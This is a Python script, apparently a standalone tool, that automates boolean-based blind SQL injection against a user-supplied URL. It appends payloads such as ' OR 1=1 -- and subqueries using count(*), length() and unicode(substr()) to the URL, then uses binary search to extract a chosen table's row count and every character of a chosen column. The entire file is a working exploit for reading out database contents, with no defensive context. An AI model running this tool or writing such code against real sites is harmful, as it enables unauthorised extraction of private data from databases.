import configparser
import ast

from bs4 import BeautifulSoup
import requests


def main():
    s = requests.Session()

    # reading config data or get it from input
    config = configparser.ConfigParser()
    config.read("config")

    url         = parse_config('url', "Input target URL: ", config)
    res_true    = parse_config('res_true', "Response on True queries: ", config)
    res_false   = parse_config('res_false', "Response on False queries: ", config)
    table_name  = parse_config('table_name', "Input name of the table you know (if so): ", config)
    col_name    = parse_config('col_name', "Input name of the column you know (if so): ", config)
    cookies     = dict(ast.literal_eval(config["Default"].get("cookies"))) \
                  if config["Default"].get("cookies") \
                  else dict(input("Set cookie #"+str(i)+": ").split() \
                  for i in range(int(input("Some cookies? (enter quantity or 0) "))))

    # parse responses
    parser(s, url, res_true, res_false, cookies, table_name, col_name)


def parse_config(key, message, config):
    if config["Default"].get(key):
        return config["Default"].get(key)
    else:
        return input(message)

def binary_search(query, x, xmin, s, url, cookies, res_true):
    xmax = x
    while True:
        if parse_with_query(query.format(x), s, url, cookies, res_true):
            xmax = min(xmax, x)
        else:
            if xmax - xmin == 1:
                return xmin
            xmin = max(xmin, x)
        x = xmin + (xmax - xmin) // 2

def parse_with_query(query, s, url, cookies, res_expected):
    try:
        page = s.get(url+query, cookies=cookies)
    # check domain accessibility
    except Exception as e:
        print('Connection error:', e)
        exit()
    if page.status_code != 200:
        print('Connection error:', page.status_code)
        exit()
    soup = BeautifulSoup(page.text, "lxml")
    return soup.findAll(string=res_expected)

def parser(s, url, res_true, res_false, cookies, table_name, col_name):
    rows_amount = 200
    approx_rows_amount = True

    # primary check for injections accessibility
    res_when_true  = parse_with_query("' OR 1=1 --", s, url, cookies, res_true)
    res_when_false = parse_with_query("' OR 1=2 --", s, url, cookies, res_true)
    print("200 OK\n"+("Looks like \"' OR 1=1 --\" works" if res_when_true and \
    (res_when_true != res_when_false) else "\"' OR 1=1 --\" doesn't work"))

    if not table_name:
        return

    # find out rows number
    query_for_rows_num = "' OR (SELECT count(*) FROM "+table_name+") --"
    if parse_with_query(query_for_rows_num, s, url, cookies, res_true):
        print("Looks like \""+query_for_rows_num+"\" works")
        query_for_rows_num = "' OR (SELECT count(*) %s {} FROM "+table_name+") --"
        # binary search #1
        rows_amount = binary_search(query_for_rows_num % "<", 60000, 1, s, url, cookies, res_true,)
        # additionally checking for result correctness
        if parse_with_query(query_for_rows_num.format(str(rows_amount)) % "=", s, url, cookies, res_true):
            print("\""+table_name+"\" table contents "+str(rows_amount)+" rows")
        else:
            print(
                  "\""+table_name+"\" table contents about "+str(rows_amount)+" rows. \
                  Please, make issue on github repo with your case"
            )
        approx_rows_amount = False
    else:
        print(query_for_rows_num)

    if not col_name:
        return

    for row_num in [str(row_int) for row_int in range(rows_amount)]:
        row_cout = str(int(row_num)+1)
        # find out length of the rows
        query_for_rows_length = "' OR (SELECT length("+col_name+") FROM "+table_name+" LIMIT "+row_num+",1) --"

        if parse_with_query(query_for_rows_length, s, url, cookies, res_true):
            print("Looks like \""+query_for_rows_length+"\" works")
            query_for_rows_length = "' OR (SELECT length("+col_name+") %s {} FROM "+table_name+" LIMIT "+row_num+",1) --"
            # binary search #2
            row_len = binary_search(query_for_rows_length % "<", 150, 1, s, url, cookies, res_true,)
            # additionally checking for result correctness
            if parse_with_query(query_for_rows_length.format(str(row_len)) % "=", s, url, cookies, res_true):
                print(
                    row_cout+" row of the \""+col_name+"\" column of the \""+\
                    table_name+"\" table have "+str(row_len)+" symbols"
                )
            else:
                print(
                    row_cout+" row of the \""+col_name+"\" column of the \""+\
                    table_name+"\" table have about "+str(row_len)+" symbols. \
                    Please, make issue on github repo with your case"
                )

        # find out rows values
        query_for_rows = "' OR (SELECT unicode(substr("+col_name+",1,1)) FROM "+table_name+" LIMIT "+row_num+",1) > 0 --"

        if parse_with_query(query_for_rows, s, url, cookies, res_true):
            print("Looks like \""+query_for_rows+"\" works")
            row_name = []
            for i in range(1, row_len + 1):
                query_for_rows = "' OR (SELECT unicode(substr("+col_name+","+str(i)+",1)) FROM "+table_name+" LIMIT "+row_num+",1) < {} --"
                # binary search #3
                row_sym = chr(binary_search(query_for_rows, 300, 1, s, url, cookies, res_true))
                # additionally checking for result correctness
                query_for_rows = "' OR (SELECT substr("+col_name+","+str(i)+",1) FROM "+table_name+" LIMIT "+row_num+",1) = '"+row_sym+"' --"
                if parse_with_query(query_for_rows, s, url, cookies, res_true):
                    row_name.append(row_sym)
                else:
                    row_name.append(row_sym)
                    print("Please, make issue on github repo with your case")
            print(
                row_cout+" row of the \""+col_name+"\" column of the \""+\
                table_name+"\" table is: "+"".join(row_name)
            )

    print("All rows of the \""+table_name+"\" table have been parsed") \
    if approx_rows_amount == False else \
    print("First "+rows_amount+" rows of the \""+table_name+"\" table have been parsed")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        print(e)
